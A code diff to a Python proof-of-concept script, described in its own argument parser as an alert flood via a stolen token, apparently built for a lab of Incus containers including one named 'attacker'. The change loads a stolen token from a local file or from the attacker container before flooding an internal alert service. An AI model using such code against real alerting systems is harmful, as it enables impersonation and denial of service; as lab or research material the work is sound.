@@ -28,7 +28,8 @@ import urllib.request
 import urllib.error
 from datetime import datetime, timezone
 
-TOKEN_FILE = "/tmp/sc_extracted_token.txt"
+TOKEN_FILE = "/root/sc_token.txt"
+ATTACKER_CONTAINER = "attacker"
 ALERT_SERVICE_INTERNAL = "http://alert-service:5500"
 
 
@@ -47,11 +48,25 @@ def _incus_ip(container="smartcity-services"):
 
 
 def _load_token(path=TOKEN_FILE):
+    # First try reading from local path (if running on the same machine as apt_attack)
     try:
         with open(path) as f:
-            return f.read().strip()
+            val = f.read().strip()
+            if val:
+                return val
     except FileNotFoundError:
-        return None
+        pass
+    # Fall back to reading from the attacker Incus container
+    try:
+        val = subprocess.check_output(
+            ["incus", "exec", ATTACKER_CONTAINER, "--", "cat", path],
+            text=True, stderr=subprocess.DEVNULL, timeout=5,
+        ).strip()
+        if val:
+            return val
+    except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
+        pass
+    return None
 
 
 parser = argparse.ArgumentParser(description="Spam PoC — alert flood via stolen token")
